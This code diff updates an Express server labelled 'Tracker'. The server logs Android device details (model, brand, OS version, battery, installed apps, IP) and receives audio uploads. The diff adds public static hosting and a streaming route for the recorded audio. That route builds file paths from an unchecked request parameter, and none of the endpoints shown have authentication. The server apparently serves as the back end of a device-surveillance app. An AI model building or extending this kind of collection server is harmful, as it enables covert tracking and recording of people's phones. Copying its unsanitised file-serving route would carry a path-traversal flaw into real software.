@@ -1,5 +1,6 @@
 const express = require('express');
 const fs = require('fs');
+const path = require('path');
 const multer = require('multer');
 
 const app = express();
@@ -8,9 +9,16 @@ app.use(express.json());
 const LOG_FILE = "logs.json";
 const MAX_LINES = 1000;
 
-/* ================= MULTER (AUDIO UPLOAD) ================= */
+/* ================= STORAGE CONFIG ================= */
 
-const upload = multer({ dest: 'uploads/' });
+const upload = multer({
+  dest: 'uploads/',
+  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
+});
+
+/* ================= STATIC ACCESS ================= */
+
+app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
 /* ================= SAVE LOG ================= */
 
@@ -62,7 +70,7 @@ function parseApps(input) {
   }
 }
 
-/* ================= TRACK (NO NOTIFICATION NOW) ================= */
+/* ================= TRACK ================= */
 
 app.get('/track', (req, res) => {
   const ip = getIP(req);
@@ -77,14 +85,11 @@ app.get('/track', (req, res) => {
   const data = {
     ip,
     userAgent: req.headers['user-agent'] || "unknown",
-
     model: safeString(req.query.model),
     brand: safeString(req.query.brand),
     android: safeString(req.query.android),
-
     battery,
     apps,
-
     time: new Date().toISOString()
   };
 
@@ -101,18 +106,20 @@ app.get('/track', (req, res) => {
 app.post('/upload-audio', upload.single('audio'), (req, res) => {
   try {
     const ip = getIP(req);
-
     const file = req.file;
 
     if (!file) {
       return res.status(400).send("No file uploaded");
     }
 
+    const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${file.filename}`;
+
     const data = {
       ip,
-      fileName: file.originalname,
+      originalName: file.originalname,
+      savedAs: file.filename,
       size: file.size,
-      path: file.path,
+      url: fileUrl,
       time: new Date().toISOString()
     };
 
@@ -121,12 +128,28 @@ app.post('/upload-audio', upload.single('audio'), (req, res) => {
 
     saveLog(data);
 
-    res.json({ status: "uploaded" });
+    res.json({
+      status: "uploaded",
+      file: file.filename,
+      url: fileUrl
+    });
 
   } catch (e) {
     console.log("Upload error:", e.message);
     res.status(500).send("error");
   }
+});
+
+/* ================= AUDIO STREAM ================= */
+
+app.get('/audio/:name', (req, res) => {
+  const filePath = path.join(__dirname, 'uploads', req.params.name);
+
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send("File not found");
+  }
+
+  res.sendFile(filePath);
 });
 
 /* ================= VIEW USERS ================= */
@@ -167,10 +190,16 @@ app.get('/clear', (req, res) => {
   }
 });
 
+/* ================= HEALTH ================= */
+
+app.get('/health', (req, res) => {
+  res.json({ status: "running" });
+});
+
 /* ================= HOME ================= */
 
 app.get('/', (req, res) => {
-  res.send("Tracker running (device + audio upload)");
+  res.send("Tracker running (device + audio upload + streaming)");
 });
 
 /* ================= START ================= */
